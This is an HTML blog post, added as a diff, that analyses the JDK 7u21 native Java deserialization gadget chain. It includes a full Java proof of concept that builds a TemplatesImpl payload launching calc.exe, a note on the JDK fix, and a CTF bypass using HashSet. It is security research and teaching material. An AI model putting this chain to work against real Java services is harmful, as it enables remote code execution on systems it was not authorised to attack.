@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="在ysoserial 的payloads目录下 有一个jdk7u21，以往的反序列化Gadget都是需要借助第三方库才可以成功执行，但是jdk7u21的Gadget执行过程中所用到的所有类都存在在JDK中 影响版本：  JDK &lt;&#x3D; 7u21  测试环境：  JDK 7u21  pom.xml 12345&lt;dependency&gt;  &lt;groupId&gt;javassist">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jdk7u21 原生反序列化链">
+<meta property="og:url" content="https://jlkl.github.io/2021/08/21/Java_05/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="在ysoserial 的payloads目录下 有一个jdk7u21，以往的反序列化Gadget都是需要借助第三方库才可以成功执行，但是jdk7u21的Gadget执行过程中所用到的所有类都存在在JDK中 影响版本：  JDK &lt;&#x3D; 7u21  测试环境：  JDK 7u21  pom.xml 12345&lt;dependency&gt;  &lt;groupId&gt;javassist">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821152925.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821153216.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821154340.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821162517.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821162705.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821162854.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821163343.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821153216.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821172349.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821174519.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821180322.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821195829.png">
+<meta property="article:published_time" content="2021-08-21T12:08:10.000Z">
+<meta property="article:modified_time" content="2021-08-21T12:11:38.714Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2021/08/21/Java_05/20210821152925.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2021/08/21/Java_05/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Jdk7u21 原生反序列化链 | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">37</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2021/08/21/Java_05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Jdk7u21 原生反序列化链
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-08-21 20:08:10 / Modified: 20:11:38" itemprop="dateCreated datePublished" datetime="2021-08-21T20:08:10+08:00">2021-08-21</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/08/21/Java_05/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/21/Java_05/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>13 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在ysoserial 的payloads目录下 有一个jdk7u21，以往的反序列化Gadget都是需要借助第三方库才可以成功执行，但是jdk7u21的Gadget执行过程中所用到的所有类都存在在JDK中</p>
+<p><strong>影响版本：</strong></p>
+<ul>
+<li>JDK &lt;= 7u21</li>
+</ul>
+<p><strong>测试环境：</strong></p>
+<ul>
+<li>JDK 7u21</li>
+</ul>
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要添加javassist依赖</p>
+<a id="more"></a>
+
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">LinkedHashSet</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">  <span class="module-access"><span class="module"><span class="identifier">LinkedHashSet</span>.</span></span>add<span class="literal">()</span></span><br><span class="line">    ...</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>hash<span class="constructor">Code()</span> (X)</span><br><span class="line">  <span class="module-access"><span class="module"><span class="identifier">LinkedHashSet</span>.</span></span>add<span class="literal">()</span></span><br><span class="line">    ...</span><br><span class="line">      <span class="constructor">Proxy(Templates)</span>.hash<span class="constructor">Code()</span> (X)</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span> (X)</span><br><span class="line">          <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>hash<span class="constructor">CodeImpl()</span> (X)</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span>hash<span class="constructor">Code()</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>member<span class="constructor">ValueHashCode()</span> (X)</span><br><span class="line">              <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>hash<span class="constructor">Code()</span> (X)</span><br><span class="line">      <span class="constructor">Proxy(Templates)</span>.equals<span class="literal">()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">          <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>equals<span class="constructor">Impl()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">              ...</span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">OutputProperties()</span></span><br><span class="line">                  <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span><span class="keyword">new</span><span class="constructor">Transformer()</span></span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">TransletInstance()</span></span><br><span class="line">                      <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>define<span class="constructor">TransletClasses()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">ClassLoader</span>.</span></span>define<span class="constructor">Class()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;<span class="literal">()</span></span><br><span class="line">                              ...</span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>入口点是在LinkedHashSet的readObject，又因为继承了HashSet，即HashSet的readObject</p>
+<p><img src="/2021/08/21/Java_05/20210821152925.png" alt="image-20210821152916574"></p>
+<p>关注<code>map.put</code>，PRESENT是一个空的object变量，跟进，大概逻辑为判断key的hash值是否和已有的相等，然后添加进value</p>
+<p><img src="/2021/08/21/Java_05/20210821153216.png" alt="image-20210821153215114"></p>
+<p>注意<code>key.equals(k)</code>，这里使用动态代理来拓展供给面，我们知道动态代理最终的调用是Handler的invoke函数实现的。这里使用的是AnnotationInvocationHandler这个动态代理handler，查看它的invoke实现</p>
+<p><img src="/2021/08/21/Java_05/20210821154340.png" alt="image-20210821154338726"></p>
+<p>方法名为equal时最后调用equalsImpl，跟进</p>
+<p><img src="/2021/08/21/Java_05/20210821162517.png" alt="image-20210821162516121"></p>
+<p>关注<code>var8 = var5.invoke(var1)</code>这个反射调用，跟进getMemberMethods</p>
+<p><img src="/2021/08/21/Java_05/20210821162705.png" alt="image-20210821162703442"></p>
+<p>equalsImpl这个函数功能大概明了了，从<code>this.type</code>获取类声明的函数，然后循环执行，type在构造函数这里可控</p>
+<p><img src="/2021/08/21/Java_05/20210821162854.png" alt="image-20210821162852684"></p>
+<p>这里用到了cc2的TemplatesImpl，详细可以参考 <a href="https://jlkl.github.io/2021/04/13/Java_04/">URLDNS&amp;Commons Collections 1-7</a>，这个类只有两个方法</p>
+<p><img src="/2021/08/21/Java_05/20210821163343.png" alt="image-20210821163340588"></p>
+<p>newTransformer方法最后会从字节码实例化恶意类从而执行其静态代码块的恶意代码</p>
+<p><strong>如何构造满足条件的hash值？</strong></p>
+<p>那么怎么才能执行<code>key.equals(k)</code>，回到<code>map.put</code>的实现</p>
+<p><img src="/2021/08/21/Java_05/20210821153216.png" alt="image-20210821153215114"></p>
+<p>首先第一次调用<code>map.put()</code>时传入的参数e是我们封装了恶意代码的TemplatesImpl对象，另一个参数就是一个空的Object对象</p>
+<p><img src="/2021/08/21/Java_05/20210821172349.png" alt="image-20210821172348046"></p>
+<p>继续put的实现，hash会调用对象本身的hashcode方法，indexFor方法则是会根据计算出的hashcode返回hash索引。第一次调用时table为空，那么就不会进入for循环。addEntry会将key添加进table，包含其hashcode还有hash索引。</p>
+<p>那么考虑第二次调用的时候要进入for循环需要根据hashcode计算出的hash索引和第一次传入的TemplatesImpl对象相同。第二次传入的是AnnotationInvocationHandler对象，那么如何让这两个类型都不同的对象计算出的hashcode是相同的呢？</p>
+<p>AnnotationInvocationHandler是动态代理的handler，调用其hashcode，最终调用hashCodeImpl</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Entry)var2.next();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>var3遍历memberValues存储的键值对，然后var1为hashcode值，memberValues构造时可控</p>
+<p><img src="/2021/08/21/Java_05/20210821174519.png" alt="image-20210821174517896"></p>
+<p>那么让memberValues的第一个键值对的值为封装了恶意代码的TemplatesImpl对象，然后关键就是</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var<span class="number">1</span> += <span class="number">127</span> * <span class="comment">((String)</span>var<span class="number">3.</span>getKey<span class="comment">()</span>).hashCode<span class="comment">()</span> ^ memberValueHashCode<span class="comment">(var3.getValue()</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看第一次循环，<code>memberValueHashCode(var3.getValue()</code>的值即为封装了恶意代码的TemplatesImpl对象的hashcode，因为0和任何数异或的结果都是那个数，那么只需要<code>((String)var3.getKey()).hashCode()</code>即key的hashcode为0就可以保证循环结束后返回的hashcode值一直为装了恶意代码的TemplatesImpl对象的hashcode，这里<code>f5a5a608</code>字符串的hashcode为0</p>
+<p>for循环过后</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">e</span>.hash == hash <span class="symbol">&amp;&amp;</span> ((<span class="name">k</span> = e.key) == key || key.equals(<span class="name">k</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>&amp;&amp;</code>和<code>||</code>有短路效果，需要满足 <code>e.hash == hash</code> 和 <code>(k = e.key) != key</code> 才会执行 <code>key.equals(k)</code></p>
+<p>第二次put传入代理对象时，<code>e.hash</code>为封装了恶意代码的TemplatesImpl对象的hashcode，我们上面已经做了处理，代理对象返回的hashcode必然和 <code>e.hash</code>相等。同时此时k为代理对象，而 <code>e.key</code> 为TemplatesImpl对象，必然不相同</p>
+<p><strong>利用思路：</strong></p>
+<ol>
+<li>构造恶意TemplatesImpl</li>
+<li>实例化一个HashMap，并添加keyf5a5a608，恶意构造好的TemplatesImpl加入到map中</li>
+<li>利用反射实例化AnnotationInvocationHandler类，传入map</li>
+<li>创建一个AnnotationInvocationHandler对象为handler的动态代理</li>
+<li>实例化HashSet，并将TemplatesImpl和设置的代理这两个对象放进去</li>
+</ol>
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建恶意class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        ((CtClass) cc).makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"> </span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"> </span><br><span class="line">        String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        Constructor handlerConstructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handlerConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 为tempHandler创造一层代理</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(App.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        HashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(set);</span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在 jdk &gt; 7u21 的版本，修复了这个漏洞，<code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 方法增加了异常抛出，导致反序列化失败</p>
+<p><img src="/2021/08/21/Java_05/20210821180322.png" alt="image-20210821180320677"></p>
+<h2 id="DASCTF-July-easyjava"><a href="#DASCTF-July-easyjava" class="headerlink" title="DASCTF July easyjava"></a>DASCTF July easyjava</h2><p>禁止序列化LinkedHashSet类</p>
+<p><img src="/2021/08/21/Java_05/20210821195829.png" alt="image-20210821195827791"></p>
+<p>序列化父类HashSet即可，当然这里肯定有其他解法</p>
+<p>HashSet和LinkedHashSet区别在于，LinkedHashSet里数据的下标和我们插入时的顺序一样，而HashSet<strong>不保证有序</strong></p>
+<p><a href="https://www.zhihu.com/question/28414001" target="_blank" rel="noopener">https://www.zhihu.com/question/28414001</a></p>
+<p>payload多打几次就可以了，实在不行交换proxy和templates的add顺序再多打几次</p>
